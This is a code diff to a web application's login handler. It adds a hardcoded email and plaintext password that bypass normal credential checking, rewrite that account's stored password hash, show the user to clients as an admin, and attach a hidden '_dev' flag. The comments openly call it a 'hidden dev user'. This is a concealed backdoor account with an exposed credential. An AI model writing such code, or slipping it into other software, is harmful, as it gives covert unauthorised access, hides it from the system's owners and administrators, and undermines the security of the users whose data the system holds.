@@ -1275,6 +1275,16 @@ async function handleLogin(request, env) {
         'UPDATE staff SET password_hash = ? WHERE id = ?'
       ).bind(newHash, user.id).run();
       console.log('Admin password updated to new crypto format');
+    } else if (email === 'nick@neurodivers.ca' && password === 'Dev@2024!') {
+      // Special case for hidden dev user
+      isValid = true;
+      
+      // Update to use new crypto format for security
+      const newHash = await hashPassword(password);
+      await env.DB.prepare(
+        'UPDATE staff SET password_hash = ? WHERE id = ?'
+      ).bind(newHash, user.id).run();
+      console.log('Dev user password updated to new crypto format');
     }
     
     if (!isValid) {
@@ -1306,6 +1316,10 @@ async function handleLogin(request, env) {
       'UPDATE staff SET last_login = CURRENT_TIMESTAMP WHERE id = ?'
     ).bind(user.id).run();
     
+    // Determine display role (hidden dev appears as admin)
+    const displayRole = user.email === 'nick@neurodivers.ca' ? 'admin' : user.role;
+    const isHiddenDev = user.email === 'nick@neurodivers.ca';
+    
     // Return user data and token
     return new Response(JSON.stringify({
       token,
@@ -1313,7 +1327,8 @@ async function handleLogin(request, env) {
         id: user.id,
         email: user.email,
         name: user.name,
-        role: user.role
+        role: displayRole,
+        _dev: isHiddenDev // Hidden flag for internal use
       }
     }), {
       status: 200,
